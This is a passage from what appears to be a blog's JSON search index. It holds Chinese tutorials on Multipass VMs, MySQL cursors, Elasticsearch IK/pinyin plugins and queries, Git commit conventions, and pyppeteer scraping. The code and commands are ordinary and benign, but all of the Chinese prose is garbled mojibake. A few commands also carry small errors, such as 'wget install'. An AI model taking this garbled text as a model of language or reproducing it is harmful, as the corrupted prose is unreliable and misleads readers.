é»˜è®¤ä¸ºprimary\n\u0026ndash;mem, -m, è™šæ‹Ÿæœºæ‰€ç”¨çš„ç‰©ç†å†…å­˜, é»˜è®¤ä¸º1GB\n\u0026ndash;disk, -d, ç£ç›˜å¤§å°, é»˜è®¤ä¸º5GB\n\u0026ndash;cpus, -c, ä½¿ç”¨çš„CPUæ ¸æ•°, é»˜è®¤ä¸º1\nimpish, ä½¿ç”¨çš„Ubuntuç‰ˆæœ¬, é‡‡ç”¨multipass findå¯ä»¥æ‰¾å‡ºæ‰€æœ‰æ”¯æŒçš„ç‰ˆæœ¬, æœ€æ–°ç‰ˆä¸º22.04.\nå›¾å½¢ç•Œé¢\næœ‰ä¸€äº›å¼€å‘ç¯å¢ƒä¸å¾—ä¸ç”¨å›¾å½¢ç•Œé¢, è¿™é‡Œä¹Ÿé‡‡ç”¨äº†å®˜ç½‘æ¨èçš„ä¸€ä¸ªæ–¹æ³•4, é€šè¿‡è¿‚å›çš„æ–¹å¼å®‰è£…å¹¶æ˜¾ç¤ºå›¾å½¢ç•Œé¢. å› ä¸ºéœ€è¦å®‰è£…è½¯ä»¶åŒ…, è¿™é‡Œéœ€è¦å…ˆè¿›è¡Œé•œåƒçš„é…ç½®, ä¸»è¦çš„æ–¹æ³•å°±å‚è€ƒæ¸…åé•œåƒäº†5, è¿™é‡Œéœ€è¦æ³¨æ„: å¦‚æœä½ ç”¨çš„ä¹Ÿæ˜¯armæ¶æ„çš„è¯, é•œåƒæºéœ€è¦é‡‡ç”¨çš„æ˜¯ubuntu-port sudo apt update sudo apt install ubuntu-desktop xrdp è®¾ç½®å¯†ç \nsudo passwd root ç„¶åä½¿ç”¨ microsoft-remote-desktop è¿æ¥è™šæ‹Ÿæœº\nä½¿ç”¨è™šæ‹Ÿæœº\nmultipass exec vm01 -- lsb_release -a multipass shell vm01 å¸¸ç”¨å‘½ä»¤\n# æŸ¥çœ‹é•œåƒ multipass find # æŸ¥çœ‹è™šæ‹Ÿæœº multipass list # å¯åŠ¨å®ä¾‹ multipass start vm01 # åœæ­¢å®ä¾‹ multipass stop vm01 # åˆ é™¤å®ä¾‹ï¼ˆåˆ é™¤åï¼Œè¿˜ä¼šå­˜åœ¨ï¼‰ multipass delete vm01 # é‡Šæ”¾å®ä¾‹ï¼ˆå½»åº•åˆ é™¤ï¼‰ multipass purge vm01 "},{"id":15,"href":"/posts/history/mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%B8%ADcursor%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"My Sqlå­˜å‚¨è¿‡ç¨‹ä¸­ Cursorçš„ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":" BEGIN DECLARE _done INT DEFAULT false; DECLARE _name,_pwd VARCHAR(50); -- å®šä¹‰æ¸¸æ ‡ï¼Œå¹¶å°†sqlç»“æœé›†èµ‹å€¼åˆ°æ¸¸æ ‡ä¸­ DECLARE my_cursor CURSOR FOR (SELECT userName,pwd from sys_user_menu WHERE menuId=22); -- å£°æ˜å½“æ¸¸æ ‡éå†å®Œåå°†æ ‡å¿—å˜é‡ç½®æˆæŸä¸ªå€¼ DECLARE CONTINUE HANDLER FOR NOT found SET _done=true; -- æ‰“å¼€æ¸¸æ ‡ OPEN my_cursor; -- å£°æ˜å¼€å§‹å¾ªç¯ my_loop:LOOP -- å°†æ¸¸æ ‡ä¸­çš„å€¼èµ‹å€¼ç»™å˜é‡ FETCH my_cursor INTO _name,_pwd; -- åˆ¤æ–­æ˜¯å¦ç»“æŸå¾ªç¯ï¼Œä¸€å®šè¦æ”¾åˆ°FETCHä¹‹åï¼Œå¦‚æœæ”¾åˆ°fetchä¹‹å‰ï¼Œ -- å…ˆåˆ¤æ–­doneï¼Œè¿™ä¸ªæ—¶å€™doneçš„å€¼è¿˜æ˜¯ä¹‹å‰çš„å¾ªç¯çš„å€¼ï¼Œå› æ­¤å°±ä¼šå¯¼è‡´å¾ªç¯ä¸€æ¬¡ IF _done THEN LEAVE my_loop; END IF; -- SELECT _doctor; INSERT INTO sys_user (userName,pwd) VALUES (_name,_pwd); -- ç»“æŸå¾ªç¯ END LOOP my_loop; -- å…³é—­æ¸¸æ ‡ CLOSE my_cursor; END "},{"id":16,"href":"/posts/history/esik%E5%88%86%E8%AF%8D+pingyin%E5%88%86%E8%AF%8D%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Esikåˆ†è¯ Pingyinåˆ†è¯çš„ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"\r1ã€åœ¨çº¿è”ç½‘å®‰è£…\r#\ræ’ä»¶çš„ç‰ˆæœ¬ä¸ESçš„ç‰ˆæœ¬è¦ä¸€è‡´\n# å®‰è£…IKåˆ†è¯å™¨æ‹¼éŸ³æ’ä»¶(Githubå®˜ç½‘) elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-pinyin/releases/download/v6.7.0/elasticsearch-analysis-pinyin-6.7.0.zip # å®‰è£…IKåˆ†è¯å™¨æ’ä»¶(Githubå®˜ç½‘) elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.7.0/elasticsearch-analysis-ik-v6.7.0.zip 2ã€ç¦»çº¿å®‰è£…\r#\r# å®‰è£…IKåˆ†è¯å™¨æ‹¼éŸ³æ’ä»¶ mkdir $ES_PATH/pinyin cd $ES_PATH/pinyin # ä¸‹è½½ wget install https://github.com/medcl/elasticsearch-analysis-pinyin/releases/download/v6.7.0/elasticsearch-analysis-pinyin-6.7.0.zip # è§£å‹ unzip elasticsearch-analysis-pinyin-6.7.0.zip -d ./ # å®‰è£…IKåˆ†è¯å™¨æ’ä»¶ mkdir $ES_PATH/ik cd $ES_PATH/ik # ä¸‹è½½ wget install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.7.0/elasticsearch-analysis-ik-v6.7.0.zip # è§£å‹ unzip elasticsearch-analysis-ik-v6.7.0.zip -d ./ 3ã€æµ‹è¯•\r#\ræµ‹è¯•pingyinåˆ†è¯\n# Kibanaæ–¹å¼ GET _analyze { \u0026#34;text\u0026#34;:\u0026#34;åˆ˜å¾·å\u0026#34;, \u0026#34;analyzer\u0026#34;:\u0026#34;pinyin\u0026#34; } # è¿”å›æ‹¼éŸ³è¡¨ç¤ºå®‰è£…å®Œæˆ { \u0026#34;tokens\u0026#34; : [ { \u0026#34;token\u0026#34; : \u0026#34;liu\u0026#34;, \u0026#34;start_offset\u0026#34; : 0, \u0026#34;end_offset\u0026#34; : 0, \u0026#34;type\u0026#34; : \u0026#34;word\u0026#34;, \u0026#34;position\u0026#34; : 0 }, { \u0026#34;token\u0026#34; : \u0026#34;de\u0026#34;, \u0026#34;start_offset\u0026#34; : 0, \u0026#34;end_offset\u0026#34; : 0, \u0026#34;type\u0026#34; : \u0026#34;word\u0026#34;, \u0026#34;position\u0026#34; : 1 }, { \u0026#34;token\u0026#34; : \u0026#34;hua\u0026#34;, \u0026#34;start_offset\u0026#34; : 0, \u0026#34;end_offset\u0026#34; : 0, \u0026#34;type\u0026#34; : \u0026#34;word\u0026#34;, \u0026#34;position\u0026#34; : 2 }, { \u0026#34;token\u0026#34; : \u0026#34;ldh\u0026#34;, \u0026#34;start_offset\u0026#34; : 0, \u0026#34;end_offset\u0026#34; : 0, \u0026#34;type\u0026#34; : \u0026#34;word\u0026#34;, \u0026#34;position\u0026#34; : 2 } ] } æµ‹è¯•ik ik_max_wordåˆ†è¯ï¼Œè¿˜æœ‰ ik_smart çš„\nGET _analyze { \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34;, \u0026#34;text\u0026#34;: [\u0026#34;ä¸­æ–‡åˆ†è¯è¯­\u0026#34;] } # è¿”å›åˆ†è¯è¡¨ç¤ºå®‰è£…å®Œæˆ { \u0026#34;tokens\u0026#34; : [ { \u0026#34;token\u0026#34; : \u0026#34;ä¸­æ–‡\u0026#34;, \u0026#34;start_offset\u0026#34; : 0, \u0026#34;end_offset\u0026#34; : 2, \u0026#34;type\u0026#34; : \u0026#34;CN_WORD\u0026#34;, \u0026#34;position\u0026#34; : 0 }, { \u0026#34;token\u0026#34; : \u0026#34;åˆ†è¯\u0026#34;, \u0026#34;start_offset\u0026#34; : 2, \u0026#34;end_offset\u0026#34; : 4, \u0026#34;type\u0026#34; : \u0026#34;CN_WORD\u0026#34;, \u0026#34;position\u0026#34; : 1 }, { \u0026#34;token\u0026#34; : \u0026#34;è¯è¯­\u0026#34;, \u0026#34;start_offset\u0026#34; : 3, \u0026#34;end_offset\u0026#34; : 5, \u0026#34;type\u0026#34; : \u0026#34;CN_WORD\u0026#34;, \u0026#34;position\u0026#34; : 2 } ] } ä¸‹é¢æˆ‘ä»¬å°†æ‹¼éŸ³ä»¥åŠåˆ†è¯éƒ½ç»“åˆèµ·æ¥è¿›è¡Œæœç´¢ï¼Œé¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç´¢å¼•ï¼Œè¿™é‡Œè¡¨ç¤ºæˆ‘ä»¬åˆ†è¯é‡‡ç”¨è‡ªå®šä¹‰çš„æ–¹å¼è¿›è¡Œåˆ†è¯æˆ‘ä»¬åˆ†åˆ«å°†ik_smartä»¥åŠik_max_wordéƒ½å¯¹pinyinè¿›è¡Œäº†æ•´åˆï¼Œå¹¶ä¸”æˆ‘ä»¬çš„ä¸»åˆ†ç‰‡3ä¸ªï¼Œæ¯ä¸ªåˆ†ç‰‡ä¸€ä¸ªå‰¯æœ¬é›†\nPUT /test_pinyin { \u0026#34;settings\u0026#34;: { \u0026#34;analysis\u0026#34;: { \u0026#34;analyzer\u0026#34;: { \u0026#34;ik_smart_pinyin\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;tokenizer\u0026#34;: \u0026#34;ik_smart\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;my_pinyin\u0026#34;, \u0026#34;word_delimiter\u0026#34;] }, \u0026#34;ik_max_word_pinyin\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;tokenizer\u0026#34;: \u0026#34;ik_max_word\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;my_pinyin\u0026#34;, \u0026#34;word_delimiter\u0026#34;] } }, \u0026#34;filter\u0026#34;: { \u0026#34;my_pinyin\u0026#34;: { \u0026#34;type\u0026#34; : \u0026#34;pinyin\u0026#34;, \u0026#34;keep_separate_first_letter\u0026#34; : true, \u0026#34;keep_full_pinyin\u0026#34; : true, \u0026#34;keep_original\u0026#34; : true, \u0026#34;first_letter\u0026#34;: \u0026#34;prefix\u0026#34;, \u0026#34;limit_first_letter_length\u0026#34; : 16, \u0026#34;lowercase\u0026#34; : true, \u0026#34;remove_duplicated_term\u0026#34; : true } } }, \u0026#34;number_of_shards\u0026#34;: 3, \u0026#34;number_of_replicas\u0026#34;: 1 } } ç„¶åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª_mappingæ¨¡æ¿ä»–çš„ç±»å‹æ˜¯_docï¼Œç”¨äºè®¾ç½®å­—æ®µæŒ‡å®šä½¿ç”¨å“ªä¸ªåˆ†è¯å™¨ï¼Œæ‰‹åŠ¨åˆ›å»ºmapping\nPUT /test_pinyin/_doc/_mapping { \u0026#34;properties\u0026#34;: { \u0026#34;content\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word_pinyin\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_smart_pinyin\u0026#34;, \u0026#34;fields\u0026#34;: { \u0026#34;keyword\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;, \u0026#34;ignore_above\u0026#34;: 256 } } }, \u0026#34;age\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;long\u0026#34; } } } ç„¶ååˆ›å»ºä¹‹åæˆ‘ä»¬æ¥å¯¼å…¥å‡ æ¡æ¡æ•°æ®\nPOST /test_pinyin/test/ { \u0026#34;content\u0026#34;:\u0026#34;å°ç±³æ‰‹æœºæœ‰ç‚¹ä¸œè¥¿\u0026#34;, \u0026#34;age\u0026#34;:18 } ç„¶åæˆ‘ä»¬å°±èƒ½å¼€å§‹æ„‰å¿«çš„æŸ¥è¯¢äº†,é¦–å…ˆæˆ‘ä»¬ä¸åˆ†è¯ç›´æ¥ä¸­æ–‡æœç´¢\n# æœç´¢å°ç±³æŸ¥è¯¢å‡ºç»“æœ POST /test_pinyin/_doc/_search { \u0026#34;query\u0026#34;:{ \u0026#34;match\u0026#34;:{ \u0026#34;content\u0026#34;:\u0026#34;å°ç±³\u0026#34; } } } # æœç´¢xiaomiæŸ¥è¯¢å‡ºç»“æœ POST /test_pinyin/_doc/_search { \u0026#34;query\u0026#34;:{ \u0026#34;match\u0026#34;:{ \u0026#34;content\u0026#34;:\u0026#34;xiaomi\u0026#34; } } } æ³¨æ„ï¼šæŸ¥è¯¢å­—ç¬¦ä¸²è¿‡é•¿å¯èƒ½å¯¼è‡´ESæœåŠ¡å™¨æŒ‚æœºï¼Œæ‰€ä»¥é™åˆ¶æŸ¥è¯¢å­—ç¬¦ä¸²é•¿åº¦ï¼Œä¸€èˆ¬ä¸º40ä¸ªé•¿åº¦å°±å¯ä»¥äº†ã€‚\n"},{"id":17,"href":"/posts/history/es%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","title":"Esçš„åŸºæœ¬ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"\råˆ›å»ºç´¢å¼•\r#\råˆ›å»ºæ–‡æ¡£\nPOST /{ç´¢å¼•åº“å} { \u0026#34;settings\u0026#34;: { \u0026#34;number_of_shards\u0026#34;: 1, \u0026#34;number_of_replicas\u0026#34;: 0 }, \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;color\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; }, \u0026#34;make\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; } } } } ä¿®æ”¹æ˜ å°„\nPUT /{ç´¢å¼•åç§°}/_mapping { \u0026#34;properties\u0026#34;:{ \u0026#34;name\u0026#34;:{ \u0026#34;type\u0026#34;:\u0026#34;text\u0026#34; }, \u0026#34;age\u0026#34;:{ \u0026#34;type\u0026#34;:\u0026#34;integer\u0026#34; } } } æŸ¥çœ‹æ˜ å°„ GET /{ç´¢å¼•åº“å}/_mapping\næ’å…¥\r#\ræ·»åŠ æ–‡æ¡£\nPOST /{ç´¢å¼•åº“å}/_doc { \u0026#34;name\u0026#34;:\u0026#34;æå››\u0026#34;, \u0026#34;age\u0026#34;:29, \u0026#34;address\u0026#34;:\u0026#34;å¤©æ´¥\u0026#34; } æ‰¹é‡å¤„ç† é’ˆå¯¹ä¸åŒçš„æ“ä½œç±»å‹ï¼Œç¬¬äºŒè¡Œçš„è¯·æ±‚ä½“æ˜¯ä¸ä¸€æ ·çš„ ï¼ˆ1ï¼‰index å’Œ create ç¬¬äºŒè¡Œæ˜¯sourceæ•°æ®ä½“ ï¼ˆ2ï¼‰delete æ²¡æœ‰ç¬¬äºŒè¡Œ ï¼ˆ3ï¼‰update ç¬¬äºŒè¡Œå¯ä»¥æ˜¯partial docï¼Œupsertæˆ–è€…æ˜¯script\nPOST /{ç´¢å¼•åº“å}/_bulk {\u0026#34;create\u0026#34;:{\u0026#34;_index\u0026#34;:\u0026#34;ç´¢å¼•å\u0026#34;, \u0026#34;_id\u0026#34;:\u0026#34;æ–‡æ¡£\u0026#34;}} // åŠ¨ä½œ {\u0026#34;field1\u0026#34;:\u0026#34;value1\u0026#34;} //è¯·æ±‚ä½“ åˆ é™¤æ–‡æ¡£ : DELETE /{ç´¢å¼•åº“å}/_doc/æ–‡æ¡£id\nå…¨é‡ä¿®æ”¹ : PUT /{ç´¢å¼•åº“å}/_doc/æ–‡æ¡£id { jsonæ–‡æ¡£ }\nå¢é‡ä¿®æ”¹ : POST /{ç´¢å¼•åº“å}/_update/æ–‡æ¡£id { \u0026ldquo;doc\u0026rdquo;: {å­—æ®µ}}\næŸ¥è¯¢\r#\ræŸ¥è¯¢æ–‡æ¡£ ï¼šGET /{ç´¢å¼•åº“å}/_doc/æ–‡æ¡£id\nGET /{ç´¢å¼•åº“å}/_search { \u0026#34;query\u0026#34;:{ \u0026#34;match_all\u0026#34;: {} } } æŸ¥è¯¢æ–‡æ¡£ï¼šGET /{ç´¢å¼•åº“å}/_search\n{ \u0026#34;query\u0026#34; : { \u0026#34;match\u0026#34; : { \u0026#34;last_name\u0026#34; : \u0026#34;Smith\u0026#34; } }, \u0026#34;sort\u0026#34;: [ { \u0026#34;date\u0026#34;: \u0026#34;desc\u0026#34; }, { \u0026#34;_score\u0026#34;: \u0026#34;desc\u0026#34; } ] } GET /{ç´¢å¼•åº“å}/_search { \u0026#34;query\u0026#34;: { \u0026#34;bool\u0026#34;: { \u0026#34;must\u0026#34;: [ { \u0026#34;match\u0026#34;: { \u0026#34;gender\u0026#34;: \u0026#34;M\u0026#34; } }, { \u0026#34;match\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;mill\u0026#34; } } ], \u0026#34;must_not\u0026#34;: [ { \u0026#34;match\u0026#34;: { \u0026#34;age\u0026#34;: \u0026#34;18\u0026#34; } } ], \u0026#34;should\u0026#34;: [ { \u0026#34;match\u0026#34;: { \u0026#34;lastname\u0026#34;: \u0026#34;Wallace\u0026#34; } } ] } } } bool ç»„åˆå¤šä¸ªæ¡ä»¶ must ä¸” must not ä¸åœ¨ should æ•°ç»„ æ»¡è¶³ä¸€ä¸ª term æ»¡è¶³ä¸€ä¸ª GET /{ç´¢å¼•åº“å}/_search { \u0026#34;query\u0026#34;: { \u0026#34;bool\u0026#34;: { \u0026#34;must\u0026#34;: [ {\u0026#34;term\u0026#34;: {\u0026#34;city\u0026#34;: \u0026#34;ä¸Šæµ·\u0026#34; }} ], \u0026#34;should\u0026#34;: [ {\u0026#34;term\u0026#34;: {\u0026#34;brand\u0026#34;: \u0026#34;çš‡å† å‡æ—¥\u0026#34; }}, {\u0026#34;term\u0026#34;: {\u0026#34;brand\u0026#34;: \u0026#34;åç¾è¾¾\u0026#34; }} ], \u0026#34;must_not\u0026#34;: [ { \u0026#34;range\u0026#34;: { \u0026#34;price\u0026#34;: { \u0026#34;lte\u0026#34;: 500 } }} ], \u0026#34;filter\u0026#34;: [ { \u0026#34;range\u0026#34;: {\u0026#34;score\u0026#34;: { \u0026#34;gte\u0026#34;: 45 } }} ] } } } æ‰¾åˆ°å§“æ°ä¸ºâ€œSmithâ€çš„å‘˜å·¥ï¼Œä½†æ˜¯æˆ‘ä»¬åªæƒ³å¾—åˆ°å¹´é¾„å¤§äº30å²çš„å‘˜å·¥ GET /{ç´¢å¼•åº“å}/_search { \u0026#34;query\u0026#34; : { \u0026#34;filtered\u0026#34; : { \u0026#34;filter\u0026#34; : { \u0026#34;range\u0026#34; : { \u0026#34;age\u0026#34; : { \u0026#34;gt\u0026#34; : 30 } \u0026lt;1\u0026gt; } }, \u0026#34;query\u0026#34; : { \u0026#34;match\u0026#34; : { \u0026#34;last_name\u0026#34; : \u0026#34;smith\u0026#34; \u0026lt;2\u0026gt; } } } } } èšåˆ\r#\rGET /{ç´¢å¼•åç§°}/_doc/_search { \u0026#34;size\u0026#34; : 0, // æŸ¥è¯¢æ¡æ•°ï¼Œè¿™é‡Œè®¾ç½®ä¸º0ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å…³å¿ƒæœç´¢åˆ°çš„æ•°æ®ï¼Œåªå…³å¿ƒèšåˆç»“æœï¼Œæé«˜æ•ˆç‡ \u0026#34;aggs\u0026#34; : { \u0026#34;popular_colors\u0026#34; : { // ç»™è¿™æ¬¡èšåˆèµ·ä¸€ä¸ªåå­—ï¼Œä»»æ„ã€‚ \u0026#34;terms\u0026#34; : { // åˆ’åˆ†æ¡¶çš„æ–¹å¼ï¼Œè¿™é‡Œæ˜¯æ ¹æ®è¯æ¡åˆ’åˆ† \u0026#34;field\u0026#34; : \u0026#34;color\u0026#34; } } } } // è¿”å› { \u0026#34;took\u0026#34;: 1, \u0026#34;timed_out\u0026#34;: false, \u0026#34;_shards\u0026#34;: { \u0026#34;total\u0026#34;: 1, \u0026#34;successful\u0026#34;: 1, \u0026#34;skipped\u0026#34;: 0, \u0026#34;failed\u0026#34;: 0 }, \u0026#34;hits\u0026#34;: { // æŸ¥è¯¢çš„æ•°æ®åˆ—è¡¨ \u0026#34;total\u0026#34;: 8, \u0026#34;max_score\u0026#34;: 0, \u0026#34;hits\u0026#34;: [] }, \u0026#34;aggregations\u0026#34;: { \u0026#34;popular_colors\u0026#34;: { // è‡ªå·±å®šä¹‰çš„æŸ¥è¯¢èšåˆ \u0026#34;doc_count_error_upper_bound\u0026#34;: 0, \u0026#34;sum_other_doc_count\u0026#34;: 0, \u0026#34;buckets\u0026#34;: [ // èšåˆæ•°æ® { \u0026#34;key\u0026#34;: \u0026#34;red\u0026#34;, \u0026#34;doc_count\u0026#34;: 4 }, { \u0026#34;key\u0026#34;: \u0026#34;blue\u0026#34;, \u0026#34;doc_count\u0026#34;: 2 }, { \u0026#34;key\u0026#34;: \u0026#34;green\u0026#34;, \u0026#34;doc_count\u0026#34;: 2 } ] } } } GET /{ç´¢å¼•åç§°}/_doc/_search { \u0026#34;size\u0026#34; : 0, \u0026#34;aggs\u0026#34; : { \u0026#34;popular_colors\u0026#34; : { \u0026#34;terms\u0026#34; : { \u0026#34;field\u0026#34; : \u0026#34;color\u0026#34; }, \u0026#34;aggs\u0026#34;:{ \u0026#34;avg_price\u0026#34;: { \u0026#34;avg\u0026#34;: { \u0026#34;field\u0026#34;: \u0026#34;price\u0026#34; } } } } } } // è¿”å› { \u0026#34;aggregations\u0026#34;: { \u0026#34;popular_colors\u0026#34;: { \u0026#34;doc_count_error_upper_bound\u0026#34;: 0, \u0026#34;sum_other_doc_count\u0026#34;: 0, \u0026#34;buckets\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;red\u0026#34;, \u0026#34;doc_count\u0026#34;: 4, \u0026#34;avg_price\u0026#34;: { \u0026#34;value\u0026#34;: 32500 } }, { \u0026#34;key\u0026#34;: \u0026#34;blue\u0026#34;, \u0026#34;doc_count\u0026#34;: 2, \u0026#34;avg_price\u0026#34;: { \u0026#34;value\u0026#34;: 20000 } }, { \u0026#34;key\u0026#34;: \u0026#34;green\u0026#34;, \u0026#34;doc_count\u0026#34;: 2, \u0026#34;avg_price\u0026#34;: { \u0026#34;value\u0026#34;: 21000 } } ] } } } "},{"id":18,"href":"/posts/history/git%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/","title":"Gitæäº¤è§„èŒƒ","section":"æˆ‘çš„åšå®¢","content":"\rGitæäº¤è§„èŒƒ\r#\ræ ¼å¼ï¼š\n\u0026lt;type\u0026gt;(\u0026lt;scope\u0026gt;): \u0026lt;subject\u0026gt; [\u0026lt;ISSUE_ID\u0026gt;] \u0026lt;body\u0026gt; \u0026lt;footer\u0026gt; ä¾‹å­ï¼š\nfeat(user): Add user registration [777] Use Tencent cloud verification code to verify mobile phone and add user registration function https://github.com/one-user/a-project/issues/777 ä»¥ä¸‹æ˜¯å­—æ®µè¯´æ˜\r#\rtype [å¿…é¡»]\r#\rç”¨äºè¯´æ˜ commit çš„ç±»åˆ«ï¼Œåªå…è®¸ä½¿ç”¨ä¸‹é¢å‡ ç§æ ‡è¯†ï¼š\nfeatï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fixï¼šä¿®è¡¥bug docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰ styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ refactorï¼šé‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ perfï¼šä¼˜åŒ– testï¼šå¢åŠ æµ‹è¯• choreï¼šæ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ revertï¼šæ’¤é”€ä¸Šä¸€æ¬¡çš„ commit\nscope [å¿…é¡»]\r#\rç”¨äºè¯´æ˜ä¿®æ”¹çš„èŒƒå›´ï¼ŒåŸºæœ¬ä¸Šæœ‰æœ‰ä»¥ä¸‹å‡ ç§æƒ…å½¢ï¼š\nallï¼šè¡¨ç¤ºå¤§èŒƒå›´çš„ä¿®æ”¹ loationï¼šè¡¨ç¤ºå°èŒƒå›´çš„ä¿®æ”¹ moduleï¼šè¡¨ç¤ºä¿®æ”¹äº†æŸä¸ªæ¨¡å— ä¾‹å¦‚ï¼šfeat(user): add user login\nsubject [å¿…é¡»]\r#\rç”¨äºè¡¨ç¤ºæœ¬æ¬¡æäº¤ä¿®æ”¹çš„ç®€è¦è¯´æ˜ï¼Œå°½é‡ç®€çŸ­\nISSUE_ID [å¯é€‰]\r#\ræ·»åŠ åœ¨ git issues ä¸­éœ€æ±‚æˆ–è€… bug ä¿®å¤å¯¹åº”çš„ issues è®°å½•ID\nbody [å¯é€‰]\r#\rbodyä¸­å°±æ˜¯ subjectçš„è¯¦ç»†è¯´æ˜\nfooter [å¯é€‰]\r#\rå¯ä»¥å†™å¤‡æ³¨ï¼Œå¡«å†™ç›¸å…³çš„éœ€æ±‚ç®¡ç† issues id\n"},{"id":19,"href":"/posts/history/pyppeeter%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","title":"Pyppeeterçš„åŸºæœ¬ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"\rèƒŒæ™¯\r#\ræŠ“åŒ…æ—¶ï¼Œé‡åˆ°ä¸€äº›ç½‘é¡µçš„ä¿¡æ¯ä¸æ¸²æŸ“é¡µé¢ä¸Šçš„ä¸ä¸€æ ·ï¼ŒåŸå› æ˜¯æŠ“åˆ°çš„æ•°æ®è¿˜æ²¡æœ‰æ¸²æŸ“ï¼Œæ‰€ä»¥ä¸ä¸€æ ·ã€‚ pyppeeterå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿˜å¯ä»¥è¿›è¡Œä¸€äº›é¡µé¢ä¸Šçš„è‡ªåŠ¨åŒ–æ“ä½œã€‚ä»è€Œè¾¾åˆ°æˆ‘æƒ³è¦çš„æ•ˆæœï¼Œåœ¨è¿™é‡Œè®°å½•ä¸‹æ¥åŸºæœ¬çš„ä½¿ç”¨æ–¹æ³•ã€‚\nåŸºæœ¬ä½¿ç”¨\r#\rå®‰è£…\npip3 install pyppeteer\nimport asyncio from pyppeteer import launch async def test(): browser = await launch(headless=False, args=[\u0026#39;--disable-infobars\u0026#39;]) page = await browser.newPage() await page.setViewport({\u0026#39;width\u0026#39;:1366,\u0026#39;height\u0026#39;:768}) # æ˜¯å¦å¯ç”¨JSï¼Œenabledè®¾ä¸ºFalseï¼Œåˆ™æ— æ¸²æŸ“æ•ˆæœ await page.setJavaScriptEnabled(enabled=True) response = await page.goto(\u0026#39;https://baidu.com/\u0026#39;) #è·å–statusã€headersã€url # print(response.status) # print(response.headers) # print(response.url) #è·å–å½“å‰é¡µæ ‡é¢˜ # print(await page.title()) #è·å–å½“å‰é¡µå†…å®¹ await asyncio.sleep(2) print(await page.content()) #æ–‡æœ¬ç±»å‹ # print(await response.text()) # cookieæ“ä½œ # print(await page.cookies()) # è·å–cookie,[{\u0026#39;name\u0026#39;:xx,\u0026#39;value\u0026#39;:xxx...},...] # page.deleteCookie() åˆ é™¤cookie # page.setCookie() è®¾ç½®cookie #å®šä½å…ƒç´  #1ã€åªå®šä½ä¸€ä¸ªå…ƒç´ ï¼ˆcssé€‰æ‹©å™¨ï¼‰ # element = await page.querySelector(\u0026#39;#s-top-left \u0026gt; a\u0026#39;) #2ã€cssé€‰æ‹©å™¨ # elements = await page.querySelectorAll(\u0026#39;#s-top-left \u0026gt; a:nth-child(2n)\u0026#39;) #3ã€xpath # elements = await page.xpath(\u0026#39;//div[@id=\u0026#34;s-top-left\u0026#34;]/a\u0026#39;) # for element in elements: # print(await (await element.getProperty(\u0026#39;textContent\u0026#39;)).jsonValue()) #è·å–æ–‡æœ¬å†…å®¹ # print(await (await element.getProperty(\u0026#39;href\u0026#39;)).jsonValue())#è·å–hrefå±æ€§ #æ¨¡æ‹Ÿè¾“å…¥å’Œç‚¹å‡» # await page.type(\u0026#39;#kw\u0026#39;,\u0026#39;ä¸­å›½\u0026#39;,{\u0026#39;delay\u0026#39;:1000}) #æ¨¡æ‹Ÿè¾“å…¥ï¼Œè¾“å…¥æ—¶é—´:1000 ms # await asyncio.sleep(2) # await page.click(\u0026#39;.swiper-button-next\u0026#39;) # await page.click(\u0026#39;.swiper-button-next\u0026#39;) #æ¨¡æ‹Ÿç‚¹å‡»ï¼Œä¹Ÿå¯ä»¥å…ˆå®šä½å…ƒç´ ï¼Œç„¶åawait element.click() # æ‰§è¡Œjsï¼Œæ»šåŠ¨é¡µé¢åˆ°åº•éƒ¨ # await page.evaluate(\u0026#39;window.scrollTo(0,document.body.scrollHeight);\u0026#39;) await asyncio.sleep(5) await browser.close() #å…³é—­æµè§ˆå™¨ if __name__ == \u0026#39;__main__\u0026#39;: asyncio.get_event_loop().run_until_complete(test()) 